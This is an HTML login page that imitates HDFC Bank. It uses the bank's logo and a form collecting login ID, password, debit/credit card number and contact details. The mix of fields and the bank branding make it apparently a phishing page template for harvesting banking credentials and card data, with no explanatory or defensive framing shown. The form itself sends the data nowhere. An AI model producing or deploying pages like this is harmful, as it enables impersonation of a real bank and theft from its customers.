<!DOCTYPE html>
<html>
  <head>
    <title>HDFC Bank Login</title>
  </head>
  <body>
    <div>
      <h1>Login to HDFC Bank</h1>
      <iframe src="https://www.hdfcbank.com/assets/images/logo.png" title="HDFC Bank Logo" width="200" height="100"></iframe>
    </div>
    <div>
      <form>
        <label for="login-id">Login ID:</label>
        <input type="text" id="login-id" name="login-id"><br><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password"><br><br>
        <label for="card-number">Debit/Credit Card Number:</label>
        <input type="text" id="card-number" name="card-number"><br><br>
        <label for="contact">Contact:</label>
        <input type="text" id="contact" name="contact"><br><br>
        <input type="submit" value="Login">
      </form>
    </div>
  </body>
</html>
